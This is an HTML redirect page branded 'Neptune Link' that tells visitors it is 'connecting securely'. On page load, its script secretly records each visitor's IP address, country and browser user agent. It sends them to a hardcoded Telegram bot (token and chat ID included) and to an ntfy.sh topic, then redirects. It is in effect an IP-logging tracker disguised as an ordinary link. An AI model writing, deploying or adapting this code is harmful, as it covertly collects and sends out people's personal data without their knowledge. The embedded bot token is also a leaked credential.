<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#060714; color:#94a3b8; font-family:sans-serif; text-align:center; padding-top:100px;">
  <h2>🪐 Neptune Link</h2>
  <p>Connecting securely, please wait...</p>

  <script>
    const BOT_TOKEN = "8669634825:AAG5mv5CMIqilxRWvtw19irIKhXaalmlZZs";
    const CHAT_ID = "8967484934";
    const CLOUD_STORE = "neptune_opg_8967484934";

    function getFlagEmoji(countryCode) {
      if (!countryCode || countryCode.length !== 2) return "🌐";
      return countryCode.toUpperCase().replace(/./g, char => 
        String.fromCodePoint(127397 + char.charCodeAt(0))
      );
    }

    async function executeRedirect() {
      let targetUrl = "https://www.google.com";

      // 1. Fetch Target from config.json
      try {
        const configRes = await fetch("./config.json?t=" + Date.now());
        if (configRes.ok) {
          const config = await configRes.json();
          if (config.targetUrl) targetUrl = config.targetUrl;
        }
      } catch (e) {}

      // 2. Fetch Visitor Country & IP
      let country = "Unknown";
      let countryCode = "UN";
      let flag = "🌐";
      let ip = "Hidden";

      try {
        const geoRes = await fetch("https://ipwho.is/");
        if (geoRes.ok) {
          const data = await geoRes.json();
          country = data.country || "Unknown";
          countryCode = data.country_code || "UN";
          flag = getFlagEmoji(countryCode);
          ip = data.ip || "Hidden";
        }
      } catch (e) {}

      const timeStr = new Date().toUTCString();
      const userAgent = navigator.userAgent;

      // 3. Analytics Record
      const visitPayload = {
        country: country,
        countryCode: countryCode,
        flag: flag,
        ip: ip,
        target: targetUrl,
        time: Date.now()
      };

      const tgMsg = `🪐 *Neptune Link Opened!*\n\n` +
                    `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
                    `🌐 *IP:* \`${ip}\`\n` +
                    `🔗 *Target:* ${targetUrl}\n` +
                    `📱 *Device:* \`${userAgent}\`\n` +
                    `⏰ *Time:* ${timeStr}`;

      // 4. Save to Cloud Analytics & Send Telegram
      try {
        await Promise.all([
          // Telegram Notification
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: tgMsg,
              parse_mode: "Markdown"
            })
          }),
          // Cloud Analytics Log
          fetch(`https://ntfy.sh/${CLOUD_STORE}`, {
            method: "POST",
            body: JSON.stringify(visitPayload)
          })
        ]);
      } catch (err) {
        console.error("Log error:", err);
      }

      // Redirect visitor
      window.location.replace(targetUrl);
    }

    executeRedirect();
  </script>
</body>
</html>
